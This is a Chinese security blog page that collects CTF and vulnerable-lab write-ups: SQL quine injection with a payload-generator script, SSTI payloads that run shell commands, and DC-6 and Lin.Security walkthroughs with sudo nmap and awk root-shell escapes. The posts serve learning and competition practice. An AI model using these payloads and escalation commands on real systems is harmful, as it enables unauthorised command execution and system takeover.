            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>quine注入,即查询的结果是查询的语句</p>
<p>首先看看如下sql语句会返回什么</p>
<pre><code class="sql">select replace(&quot;.&quot;,char(46),&quot;.&quot;);
</code></pre>
<p>返回了一个点</p>
<p>匹配字符串”.”中ascii码为46的字符并替换为”.”,也就是将”.”转换为”.”并返回</p>
<p>继续看下面这个sql语句</p>
<pre><code class="sql">select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;);
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/ddd986e7bc6d49d995755fb301370584.png" alt="在这里插入图片描述">很相似,但并不完全一致,查询出的结果是双引号的</p>
<p>此处将字符串    <strong>replace(“.”,char(46),”.”)</strong></p>
<p>中ascii码为46的字符替换为另一字符串 <strong>replace(“.”,char(46),”.”)</strong></p>
<p>也就是</p>
<p><strong>replace(“replace(“.”,char(46),”.”)”,char(46),”replace(“.”,char(46),”.”)”)</strong></p>
<p>观察原来的查询语句</p>
<p><strong>replace(‘ replace(“.”,char(46),”.”)’,char(46),’replace(“.”,char(46),”.”)’)</strong></p>
<p>那么我们只需要将双引号替换成单引号就行</p>
<pre><code class="sql">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));
</code></pre>
<p>所以需要替换的字符串就变成了</p>
<pre><code class="sql">&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;
</code></pre>
<p>这一步是替换单双引号</p>
<pre><code class="sql">select replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39));
</code></pre>
<p>这一步是替换点为相关字符</p>
<pre><code class="sql">select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
</code></pre>
<p>最终得到如上结果</p>
<p>这样我们确实是可以执行sql语句了,但是还需要解决注入的问题(这样只能堆叠)<br>所以加入union select的sql语句如下</p>
<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
</code></pre>
<h1 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h1><p>构造过程如下<br>第一步拿基本语句作为替换语句<br>比如我想要 1’union select #</p>
<pre><code class="sql">1&quot;union select #
</code></pre>
<p>转单引号为双引号</p>
<pre><code class="sql">1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#
</code></pre>
<p>放入基本语句</p>
<p>第二步拼接</p>
<pre><code class="sql">replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)
</code></pre>
<pre><code class="sql">replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)
</code></pre>
<p>补全</p>
<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
</code></pre>
<h1 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h1><p>适用于如下的条件<br><img src="https://img-blog.csdnimg.cn/img_convert/8af6284c4c69e50af99460d0e3239738.png" alt="image-20230424135507408"><img src="https://img-blog.csdnimg.cn/img_convert/b0d43f37612ab511373ebcf8ca00f301.png" alt="image-20230424135535557"></p>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="python">sql = input (&quot;输入你的sql语句,不用写关键查询的信息  形如 1&#39;union select #\n&quot;)
sql2 = sql.replace(&quot;&#39;&quot;,&#39;&quot;&#39;)
base = &quot;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&quot;
final = &quot;&quot;
def add(string):
    if (&quot;--+&quot; in string):
        tem = string.split(&quot;--+&quot;)[0] + base + &quot;--+&quot;
    if (&quot;#&quot; in string):
        tem = string.split(&quot;#&quot;)[0] + base + &quot;#&quot;
    return tem
def patch(string,sql):
    if (&quot;--+&quot; in string):
        return sql.split(&quot;--+&quot;)[0] + string + &quot;--+&quot;
    if (&quot;#&quot; in string):
        return sql.split(&quot;#&quot;)[0] + string + &quot;#&quot;

res = patch(base.replace(&quot;.&quot;,add(sql2)),sql).replace(&quot; &quot;,&quot;/**/&quot;).replace(&quot;&#39;.&#39;&quot;,&#39;&quot;.&quot;&#39;)

print(res)
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00a596">数据库</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/sql/" style="color: #ffa2c4">sql</a>
        </span>
        
    </div>
    <a href="/2023/04/24/sql%E6%B3%A8%E5%85%A5%20Quine%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-6靶机通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/21
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/28790b49d34a4f6a9dbfb3c459016658.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e498790d905f451b9ef93877cc7d3a05.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>发现无法访问web<br>加个hosts<br><img src="https://img-blog.csdnimg.cn/75398b9fcbd64e47bdbab59e3637f972.png" alt="在这里插入图片描述"><br>这题类似那个dc2还是dc3,网站长的一样<br><img src="https://img-blog.csdnimg.cn/59cd4b9ce9f746a8b158c0f6f9559c16.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/c5894d31c6ee48c380e856fcb187ed97.png" alt="在这里插入图片描述"><br>wordPress5.1.1<br>上wpscan扫<br>enumrate一下user 看看能不能弱口令<br>测了wp给的那几个用户,都不能弱口令,dirsearch也没扫到什么有价值的路径<br>尝试ssh弱口令<br>没爆出来,回官网看了下描述<br><img src="https://img-blog.csdnimg.cn/5f2193d7f0fa408dbe4e7e1b6a6080e5.png" alt="在这里插入图片描述"><br>确实是弱口令,但是我的字典差着了,给了提示就用吧<br><img src="https://img-blog.csdnimg.cn/f164d3474e204bf5af16ed2ae7992e7d.png" alt="在这里插入图片描述"><br>账号mark 密码 helpdesk01<br>登录后台<br><img src="https://img-blog.csdnimg.cn/2297c026c7de49e390cea88fa1f3ece0.png" alt="在这里插入图片描述"><br>尝试使用相关插件漏洞<br><img src="https://img-blog.csdnimg.cn/f1e17535c6ab4667864691bfa8df275e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/be2c598f6e5344888e2875d9ca6c2774.png" alt="在这里插入图片描述"><br>发包,然后拿到反弹的shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/fbc678aa07754f649e1bbd466a7fce1e.png" alt="在这里插入图片描述"><br>用LinEnum.sh遍历脆弱性<br>没发现什么可以利用的<br>回去翻home目录ls -al看看文件<br>发现jens用户下有一个backup.sh<br><img src="https://img-blog.csdnimg.cn/c83c00e12a9844efb78be073bb7667ad.png" alt="在这里插入图片描述"><br>然而我们不是devs组的,没法写这个文件<br>继续看<br><img src="https://img-blog.csdnimg.cn/092758c8d43042488b6fc5547586110c.png" alt="在这里插入图片描述"><br>发现mark下有个stuff文件夹<br>其内存在一个txt文件<br>里面暴露了graham的账号<br>尝试ssh登录<img src="https://img-blog.csdnimg.cn/51924e6673a2464d84fabc90f405d254.png" alt="在这里插入图片描述"></p>
<p>登录上发现graham是该组的<br>sudo -l看看有什么可用的<br><img src="https://img-blog.csdnimg.cn/0b4821478d57468bba33942bf1cd8e8f.png" alt="在这里插入图片描述"></p>
<p>发现我们可以以jens的身份去运行backups.sh文件,且我们可以写这个sh文件,那么我们就可以拿一个jens用户的shell了<br><img src="https://img-blog.csdnimg.cn/1a26bb17bc0a4abeab0fefca202a1832.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b21a30ba7ed84aed91f3b86d47ce1261.png" alt="在这里插入图片描述"><br>可以尝试nmap提权<br><code>TF=$(mktemp) echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; $TF sudo nmap --script=$TF </code><br>这时候其实就拿到root权限的用户了,但是是看不见自己打了什么命令的,盲打一个优化shell<br><img src="https://img-blog.csdnimg.cn/6590c3a7571e41009eb640f10ea6c048.png" alt="在这里插入图片描述"><br>结束</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #03a9f4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #00bcd4">运维</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/ssh/" style="color: #ffa2c4">ssh</a>
        </span>
        
    </div>
    <a href="/2023/04/21/DC-6%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">2023 GDOUCTF 部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/16
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>js改个高分然后去送<img src="https://img-blog.csdnimg.cn/4f549bced35444c2b171ef7068ca3c78.png" alt="在这里插入图片描述"></p>
<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/5bdcf86c3ab2457aa2ce4a2709a071a7.png" alt="在这里插入图片描述"></p>
<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>看源码然后发put包<br><img src="https://img-blog.csdnimg.cn/a6ebfe910bf74701bfa85a18624d983a.png" alt="在这里插入图片描述"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h2><p>过滤挺多的 . _ 然后各种关键字<br>点用|attr()绕   下划线用拼接<br><img src="https://img-blog.csdnimg.cn/7175d0010532459e89192baf12aa5cec.png" alt="在这里插入图片描述"><br>payload如下<br><code>name=&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;&#123;% set bs=(a,a,dict(bas=a,e=b)|join(),a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;&#123;%set pp=dict(pop=a,en=b)|join %&#125;&#123;%set r=self|string|attr(geti)(18)%&#125;&#123;%set rd=dict(read=a)|join%&#125;&#123;%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)('cat /flag')|attr('read')() )%&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><pre><code class="python">cipher = &#39;+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#39;
encryptedString = &quot;&quot;
decryptedString = &#39;&#39;
for char in cipher:
    if char == &#39;!&#39;:
        decryptedString += &#39;a&#39;
    elif char == &#39;1&#39;:
        decryptedString += &#39;b&#39;
    elif char == &#39;)&#39;:
        decryptedString += &#39;c&#39;
    elif char == &#39;v&#39;:
        decryptedString += &#39;d&#39;
    elif char == &#39;m&#39;:
        decryptedString += &#39;e&#39;
    elif char == &#39;+&#39;:
        decryptedString += &#39;f&#39;
    elif char == &#39;q&#39;:
        decryptedString += &#39;g&#39;
    elif char == &#39;0&#39;:
        decryptedString += &#39;h&#39;
    elif char == &#39;c&#39;:
        decryptedString += &#39;i&#39;
    elif char == &#39;]&#39;:
        decryptedString += &#39;j&#39;
    elif char == &#39;(&#39;:
        decryptedString += &#39;k&#39;
    elif char == &#39;&#125;&#39;:
        decryptedString += &#39;l&#39;
    elif char == &#39;[&#39;:
        decryptedString += &#39;m&#39;
    elif char == &#39;8&#39;:
        decryptedString += &#39;n&#39;
    elif char == &#39;5&#39;:
        decryptedString += &#39;o&#39;
    elif char == &#39;$&#39;:
        decryptedString += &#39;p&#39;
    elif char == &#39;*&#39;:
        decryptedString += &#39;q&#39;
    elif char == &#39;i&#39;:
        decryptedString += &#39;r&#39;
    elif char == &#39;&gt;&#39;:
        decryptedString += &#39;s&#39;
    elif char == &#39;#&#39;:
        decryptedString += &#39;t&#39;
    elif char == &#39;&lt;&#39;:
        decryptedString += &#39;u&#39;
    elif char == &#39;?&#39;:
        decryptedString += &#39;v&#39;
    elif char == &#39;o&#39;:
        decryptedString += &#39;w&#39;
    elif char == &#39;^&#39;:
        decryptedString += &#39;x&#39;
    elif char == &#39;-&#39;:
        decryptedString += &#39;y&#39;
    elif char == &#39;_&#39;:
        decryptedString += &#39;z&#39;
    elif char == &#39;h&#39;:
        decryptedString += &#39;0&#39;
    elif char == &#39;w&#39;:
        decryptedString += &#39;1&#39;
    elif char == &#39;e&#39;:
        decryptedString += &#39;2&#39;
    elif char == &#39;9&#39;:
        decryptedString += &#39;3&#39;
    elif char == &#39;g&#39;:
        decryptedString += &#39;4&#39;
    elif char == &#39;z&#39;:
        decryptedString += &#39;5&#39;
    elif char == &#39;d&#39;:
        decryptedString += &#39;6&#39;
    elif char == &#39;~&#39;:
        decryptedString += &#39;7&#39;
    elif char == &#39;=&#39;:
        decryptedString += &#39;8&#39;
    elif char == &#39;x&#39;:
        decryptedString += &#39;9&#39;
    elif char == &#39;j&#39;:
        decryptedString += &#39;!&#39;
    elif char == &#39;:&#39;:
        decryptedString += &#39;@&#39;
    elif char == &#39;4&#39;:
        decryptedString += &#39;#&#39;
    elif char == &#39;b&#39;:
        decryptedString += &#39;$&#39;
    elif char == &#39;`&#39;:
        decryptedString += &#39;%&#39;
    elif char == &#39;l&#39;:
        decryptedString += &#39;^&#39;
    elif char == &#39;3&#39;:
        decryptedString += &#39;&amp;&#39;
    elif char == &#39;t&#39;:
        decryptedString += &#39;*&#39;
    elif char == &#39;6&#39;:
        decryptedString += &#39;(&#39;
    elif char == &#39;s&#39;:
        decryptedString += &#39;)&#39;
    elif char == &#39;n&#39;:
        decryptedString += &#39;_&#39;
    elif char == &#39;;&#39;:
        decryptedString += &#39;+&#39;
    elif char == &#39;\&#39;&#39;:
        decryptedString += &#39;-&#39;
    elif char == &#39;r&#39;:
        decryptedString += &#39;=&#39;
    elif char == &#39;k&#39;:
        decryptedString += &#39;`&#39;
    elif char == &#39;p&#39;:
        decryptedString += &#39;~&#39;
    elif char == &#39;\&quot;&#39;:
        decryptedString += &#39;&#123;&#39;
    elif char == &#39;&amp;&#39;:
        decryptedString += &#39;&#125;&#39;
    elif char == &#39;/&#39;:
        decryptedString += &#39;[&#39;
    elif char == &#39;\\&#39;:
        decryptedString += &#39;]&#39;
    elif char == &#39;2&#39;:
        decryptedString +=  &#39;|&#39;
    elif char == &#39;.&#39;:
        decryptedString += &#39;:&#39;
    elif char == &#39;%&#39;:
        decryptedString += &#39;;&#39;
    elif char == &#39;|&#39;:
        decryptedString += &#39;&quot;&#39;
    elif char == &#39;,&#39;:
        decryptedString += &quot;&#39;&quot;
    elif char == &#39;@&#39;:
        decryptedString += &#39;&lt;&#39;
    elif char == &#39;&#123;&#39;:
        decryptedString += &#39;&gt;&#39;
    elif char == &#39;u&#39;:
        decryptedString += &#39;,&#39;
    elif char == &#39;7&#39;:
        decryptedString += &#39;.&#39;
    elif char == &#39;y&#39;:
        decryptedString += &#39;?&#39;
    elif char == &#39;a&#39;:
        decryptedString += &#39;/&#39;

    print(decryptedString)
</code></pre>
<h2 id="babylua"><a href="#babylua" class="headerlink" title="babylua"></a>babylua</h2><p>先爆破得到key<br>有key就可以直接解密了</p>
<pre><code class="python">import hashlib
import string
cipher = [&#39;200&#39;, &#39;161&#39;, &#39;198&#39;, &#39;157&#39;, &#39;173&#39;, &#39;169&#39;, &#39;199&#39;, &#39;150&#39;, &#39;105&#39;, &#39;163&#39;, &#39;193&#39;, &#39;175&#39;, &#39;173&#39;, &#39;194&#39;, &#39;135&#39;, &#39;131&#39;, &#39;135&#39;, &#39;225&#39;]
flag = &#39;&#39;

# key10 = &#39;b5e62abe84&#39;
# string = string.ascii_letters
# for i in string:
#     for j in string:
#         for k in string:
#             for l in string:
#                 seed = i+j+k+l
#                 key = hashlib.md5(seed.encode()).hexdigest()
#                 key = hashlib.md5(key.encode()).hexdigest()
#                 if(key[:10] == key10):
#                     print(key)

# b5e62abe84bc8afbfd97c91a15aa0867

key = &#39;b5e62abe84bc8afbfd97c91a15aa0867&#39;
for i in range(len(cipher)):
    flag += chr(int(cipher[i])-ord(key[i])) 
print(flag)
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
        </span>
        
    </div>
    <a href="/2023/04/16/2023%20GDOUCTF%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/02/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF2023%20%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">CTFSHOW愚人杯2023 部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/2
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>url是base64编码后的文件名<br>直接读个index.php<br>然后查看源码 解码base64</p>
<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>过滤了斜杠,不能访问根目录了,考虑手动拼接一个<code>&#123;&#123;lipsum.__globals__.os.popen(lipsum.__globals__.__str__().__getitem__(34)~lipsum.__globals__.__str__().__getitem__(5)~lipsum.__globals__.__str__().__getitem__(22)~lipsum.__globals__.__str__().__getitem__(139)~lipsum.__globals__.__str__().__getitem__(288)~lipsum.__globals__.__str__().__getitem__(87)~lipsum.__globals__.__str__().__getitem__(24)~lipsum.__globals__.__str__().__getitem__(5)~lipsum.__globals__.__str__().__getitem__(54)).read()&#125;&#125;</code></p>
<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>session伪造<br>伪造成admin登录后可以任意文件下载<br>下个app.py看源码<br><img src="https://img-blog.csdnimg.cn/27056cbdb97f4210938891d4598a2391.png" alt="在这里插入图片描述"><br>hello路由下存在ssti<br>可以tplmap一把梭<br>手动挡payload如下<br><code>request.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat /*&quot;).read()&#39;)</code></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="easy-pyc"><a href="#easy-pyc" class="headerlink" title="easy_pyc"></a>easy_pyc</h2><p>反编译得到py源码</p>
<pre><code class="bash">uncompyle6 -o a.py  xxx.pyc
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/1215d68442904abf9363308072d5f3c3.png" alt="在这里插入图片描述"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>签到 解码base64即可</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>09改00然后bandzip修复<br><img src="https://img-blog.csdnimg.cn/2e79b84f20ab44e0a70adf19822a66ab.png" alt="在这里插入图片描述"><br>crc爆破宽高<br><img src="https://img-blog.csdnimg.cn/e2a0bd20912641338742680c0ff7dc03.png" alt="在这里插入图片描述"><br>修改高度为300<br>Ocr识别得到<br>5oSa5Lq66lqC5b+r5LmQ77yB77yB77yB解base64可以得到类似愚人节快乐的字符串<br>没什么用<br>Binwalk抽下图<br>发现里面还有一个压缩包<br>010打开</p>
<p><img src="https://img-blog.csdnimg.cn/7de6f026102a47139a8d61d58d44df2c.png" alt="在这里插入图片描述"><br>在最后发现key的base64编码后的值,解码得到yurenjie<br>解压得到图片<br>crc 完了ocr<br><img src="https://img-blog.csdnimg.cn/ee8fc6602dea47be99d7858ac328f0bc.png" alt="在这里插入图片描述"></p>
<h2 id="琴柳感"><a href="#琴柳感" class="headerlink" title="琴柳感"></a>琴柳感</h2><p><img src="https://img-blog.csdnimg.cn/62c27d36fd3d41de951b989b8c9c6045.png" alt="在这里插入图片描述"><br>观察发现除去开头和结尾独立的两句话 一共来回四句话<br>猜测四进制<br>四位一组要想能解出字母第一位必是1 因为4^3 &#x3D;64<br>那么所有的<code>你有没有感受到城市在分崩离析？</code>替换为1,另外三局遍历替换<br>最终得到的四进制的字符串</p>
<pre><code class="bash">120313101212130312201233131313231320122112321213120213111203121112321213132012211232121311331321122112021311132212011221132112211133132212011221122312111230122112011232132112211230122112011232120212011331
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/49ebbc33ab614e36a0953f9c3c36f343.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/python/" style="color: #03a9f4">python</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #ff7d73">php</a>
        </span>
        
    </div>
    <a href="/2023/04/02/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF2023%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/03/27/NKCTF2023%20web%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">NKCTF2023 web部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/27
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h1><p><img src="https://img-blog.csdnimg.cn/bfa70902a1ee4a2a9d7350b34fdabcab.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3851c10c12b540cd9303dec18fdb98a8.png" alt="在这里插入图片描述"><br>Md5数组绕过 sha1强碰撞  php传值不能_但是[ ]会被视作_ 无字母数字rce 可以考虑取反</p>
<h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><p><img src="https://img-blog.csdnimg.cn/a76edd3704434c18ab39bb0346450931.png" alt="在这里插入图片描述"><br>过滤了a,f,l,g和通配符<br>我考虑的是urldecode来绕<br><img src="https://img-blog.csdnimg.cn/2ece72e5162f4cc8aeefab7cecce6a27.png" alt="在这里插入图片描述"><br>这里注意<code>/</code>的url编码是<code>%2f</code><br>手动改成&#x2F;</p>
<h1 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h1><p>无字母数字rce<br>禁用了很多危险函数,可以先开phpinfo看看<br><img src="https://img-blog.csdnimg.cn/017197b9df0c4fae975a7bb62efb71b6.png" alt="在这里插入图片描述"></p>
<p>在phpinfo中发现shell_exec没有被禁用<br>但是shell_exec无回显,尝试重定向写出数据</p>
<p><img src="https://img-blog.csdnimg.cn/dfc583cc2be847e58e1e63d78f4bf569.png" alt="在这里插入图片描述"></p>
<h1 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h1><p>禅道,找个利用工具一把梭<br><img src="https://img-blog.csdnimg.cn/5065eaff0fe042afb795afd7f16193d8.png" alt="在这里插入图片描述"></p>
<h1 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h1><p>弱口令admin admin<br>发现是dedecms5.7<br>找个exp<br><img src="https://img-blog.csdnimg.cn/17423411b14e4874adc5f54e7a8a59ee.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00a596">php</a>
        </span>
        
    </div>
    <a href="/2023/03/27/NKCTF2023%20web%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/03/20/Lin.Security%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/">
        <h2 class="post-title">Lin.Security靶机学习</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/20
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><strong>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a></strong></p>
<h1 id="靶机网络配置"><a href="#靶机网络配置" class="headerlink" title="靶机网络配置"></a>靶机网络配置</h1><p>先用用户名bob 密码secret登录<br>然后提权到root</p>
<pre><code class="bash">sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
</code></pre>
<p>注意由于环境的配置 双引号是shift+2</p>
<p>提权完毕后</p>
<pre><code class="bash">vim /etc/default/keyboard
</code></pre>
<p>将XKBLAYOUT改为us</p>
<pre><code class="bash">vim /etc/netplan/50-cloud-init.yaml
</code></pre>
<p>将enp0s3改为ens33</p>
<p>然后<br><code>setupcon</code>   再  <code>netplan apply</code></p>
<h1 id="环境扫描"><a href="#环境扫描" class="headerlink" title="环境扫描"></a>环境扫描</h1><p>去看看lin.security靶机的网卡地址<br><img src="https://img-blog.csdnimg.cn/80c5708e0e49454bae75ce336dcd8039.png" alt="在这里插入图片描述"></p>
